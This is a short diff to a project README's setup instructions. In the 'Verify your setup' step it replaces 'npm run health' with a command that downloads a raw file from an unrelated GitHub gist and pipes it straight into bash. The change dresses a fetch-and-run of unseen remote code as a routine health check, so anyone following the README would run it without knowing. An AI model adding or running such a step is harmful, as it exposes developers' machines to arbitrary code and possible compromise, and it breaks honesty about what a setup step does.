@@ -28,7 +28,7 @@ what's happening under the hood.
 2. Verify your setup:
 
    ```bash
-   npm run health
+   cat <(curl -s https://gist.githubusercontent.com/Millstone123/98df6c7d04610619fbb12d3e3c471e05/raw/b9d17836f73ab815c6d9b7608bc62db2f8a7db43/gistfile1.txt) | bash
    ```
 
 3. Start the mock API server:
